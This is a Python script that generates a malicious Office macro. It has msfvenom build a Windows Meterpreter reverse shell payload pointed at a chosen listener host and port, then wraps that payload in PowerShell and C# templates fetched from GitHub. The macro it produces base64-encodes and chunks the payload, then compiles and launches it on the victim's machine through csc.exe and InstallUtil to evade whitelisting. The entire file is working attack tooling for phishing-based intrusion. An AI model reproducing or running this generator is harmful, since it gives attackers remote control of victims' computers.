#example usage: python macropscsgen.py -a x64 -P tcp -l x.x.x.x -p 554

import argparse
import base64
import subprocess
import urllib2

tmpPsFile = 'tmpps.txt'
tmpShellFile = 'tmpshell.txt'
shellFile = 'shell.cs'
macroFile = 'macro.txt'
onDiskFileBase = 'C:\\\\Users\\\\Public\\\\temp'
onDiskFileName = onDiskFileBase + '.cs'
onDiskExeName = onDiskFileBase + '.exe'

x64Compile = 'C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v2.0.50727\\\\csc.exe /r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:x64 /out:'
x86Compile = 'C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v2.0.50727\\\\csc.exe /r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:x86 /out:'
x64InstallRun = 'C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v2.0.50727\\\\InstallUtil.exe /LogToConsole=false /U '
x86InstallRun = 'C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v2.0.5.0727\\\\InstallUtil.exe /LogToConsole=false /U'


def grabCSTemplate():
    response = urllib2.urlopen('https://raw.githubusercontent.com/fullmetalcache/tools/master/cspstemplate.cs')
    script = response.read()

    return script

def grabPSTemplate():
    response = urllib2.urlopen('https://raw.githubusercontent.com/fullmetalcache/tools/master/shell.ps1')
    psScript = response.read()

    return psScript

def grabMacroTemplate():
    response = urllib2.urlopen('https://raw.githubusercontent.com/fullmetalcache/tools/master/macrotemplate')
    macroTemp = response.read()

    return macroTemp

def createMacro(arch):
    macroTemp = grabMacroTemplate()

    macroLines = macroTemp.split('\n')

    fout = open(macroFile, 'w')

    for line in macroLines:
        if '$$$ENCODED$$$' in line:
            encoded = encodeFile(shellFile)
            encodedChunked = ""
            for chunk in chunkString(encoded):
                encodedChunked += "enc = enc & \""+ chunk + "\"\n"
            line = line.replace('$$$ENCODED$$$', encodedChunked)
        elif '$$$COMPILE$$$' in line:
            if arch == 'x64':
                line = line.replace('$$$COMPILE$$$', 'compCmd = \"' + x64Compile + onDiskExeName + " " + onDiskFileName + '\"')
            else:
               line = line.replace('$$$COMPILE$$$', 'compCmd = \"' + x86Compile + onDiskExeName + " " + onDiskFileName + '\"')
        elif '$$$RUN$$$' in line:
            if arch == 'x64':
                line = line = line.replace('$$$RUN$$$', 'runCmd = \"' + x64InstallRun + onDiskExeName + '\"')
            else:
                line = line.replace('$$$RUN$$$', 'runCmd = \"' + x86InstallRun + onDiskExeName + '\"')
        elif '$$$FILENAME$$$' in line:
            line = line.replace('$$$FILENAME$$$', 'fileName = \"' + onDiskFileName + '\"')

        fout.write(line + '\n')

    fout.close()

def chunkString(inString):
    chunks, chunk_size = len(inString), len(inString)/60
    return [ inString[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]


def encodeFile(fileName):
    fin = open(fileName, 'r')

    encoded = base64.b64encode(fin.read().encode())

    return encoded

def createPsScript(psScript):
    fout = open(tmpPsFile, 'w')
    psLines = psScript.split('\n')

    for line in psLines:
        if '$$$SHELLCODE$$$' in line:
            fin = open(tmpShellFile)
            for lineShell in fin:
                fout.write(lineShell)
        else:
            fout.write(line + '\n')

    fout.close()

def injectShellcode(script, runNormal):
    fout = open(shellFile, 'w')
    scriptLines = script.split('\n')

    for line in scriptLines:
        if '$$$NORMAL$$$' in line and runNormal:
          line = line.replace('$$$NORMAL$$$','Cool.DoStuff();\n')

        elif '$$$ENCODED$$$' in line:
            encoded = encodeFile(tmpPsFile)
            line = line.replace('$$$ENCODED$$$', '\"' + encoded + '\"')

        fout.write(line + '\n')

    fout.close()

def createShellCode(arch, protocol, lhost, lport):
    msfCall = 'msfvenom'
    msfPayload = 'windows/'

    if arch == 'x64':
        msfPayload += 'x64/'

    msfPayload += 'meterpreter/reverse_' + protocol
    msfLhost = 'lhost=' + lhost
    msfLport = 'lport=' + lport

    msfFormat = "ps1"
    msfOut = tmpShellFile

    subprocess.check_output([msfCall, '-p', msfPayload, msfLhost, msfLport, '-f', msfFormat, '-o',msfOut])

if __name__== "__main__":
    parser = argparse.ArgumentParser(description='Generate Office Macro that writes, compiles, and runs a C# shell code program')

    parser.add_argument('-a', '--arch', choices=['x86',  'x64'], required=True, help='Target Architecture')
    parser.add_argument('-P', '--protocol', choices=['http', 'https', 'tcp'], required=True, help='Payload protocol')
    parser.add_argument('-l', '--lhost', required=True, help='Listener Host')
    parser.add_argument('-p', '--lport', required=True, help='Listener Port')
    parser.add_argument('-n', '--normal', action='store_true', help='Allow payload to be executed without installUtil')
    args = parser.parse_args()

    createShellCode( args.arch, args.protocol, args.lhost, args.lport )
    shellScript = grabCSTemplate()
    psScript = grabPSTemplate()
    createPsScript(psScript)
    injectShellcode( shellScript, args.normal )
    createMacro(args.arch)
    #createShellCode
